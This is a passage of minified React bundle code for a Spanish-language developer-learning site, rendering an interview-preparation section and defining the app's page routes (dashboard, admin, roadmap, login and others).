aprendiz."})]})]})]}),g.jsx("section",{className:"interview-prep glass-effect",children:g.jsxs("div",{className:"prep-info",children:[g.jsx("h3",{children:"Preparacin para Entrevistas"}),g.jsxs("div",{className:"prep-grid",children:[g.jsxs("div",{className:"prep-item",children:[g.jsx("h5",{children:"Criba Tcnica"}),g.jsx("p",{children:"Practica en LeetCode (Easy/Medium) y entiende la Complejidad Temporal (Big O)."})]}),g.jsxs("div",{className:"prep-item",children:[g.jsx("h5",{children:"Entrevista de Sistema"}),g.jsx("p",{children:"Para niveles Senior, estudia cmo escalar bases de datos, balanceadores de carga y cach."})]}),g.jsxs("div",{className:"prep-item",children:[g.jsx("h5",{children:"Cultura y Fit"}),g.jsx("p",{children:"Prepara historias usando el mtodo STAR (Situacin, Tarea, Accin, Resultado)."})]})]})]})})]})},H5=()=>g.jsx($k,{children:g.jsx(RN,{children:g.jsxs(jk,{children:[g.jsx(_t,{path:"/",element:g.jsx(IN,{})}),g.jsx(_t,{path:"/dashboard",element:g.jsx(Fo,{children:g.jsx(DN,{})})}),g.jsx(_t,{path:"/admin",element:g.jsx(p5,{children:g.jsx(d5,{})})}),g.jsx(_t,{path:"/roadmap",element:g.jsx(Fo,{children:g.jsx(MN,{})})}),g.jsx(_t,{path:"/projects",element:g.jsx(Fo,{children:g.jsx(u5,{})})}),g.jsx(_t,{path:"/profile",element:g.jsx(Fo,{children:g.jsx(h5,{})})}),g.jsx(_t,{path:"/cheatsheets",element:g.jsx(Fo,{children:g.jsx(z5,{})})}),g.jsx(_t,{path:"/libraries",element:g.jsx(Fo,{children:g.jsx(f5,{})})}),g.jsx(_t,{path:"/div-playground",element:g.jsx(Fo,{children:g.jsx(V5,{})})}),g.jsx(_t,{path:"/career-advice",element:g.jsx(Fo,{children:g.jsx(F5,{})})}),g.jsx(_t,{path:"/learn/:moduleId",element:g.jsx(Fo,{children:g.jsx(i5,{})})}),g.jsx(_t,{path:"/login",element:g.jsx(r5,{})}),g.jsx(_t,{path:"/register",element:g.jsx(s5,{})})]})})});function G5(){return g.jsx(H5,{})}Xq.createRoot(document.getElementById("root")).render(g.jsx(F.StrictMode,{children:g.jsx(C_,{children:g.jsx(T_,{children:g.jsx(A_,{children:g.jsx(q_,{children:g.jsx(G5,{})})})})})}));
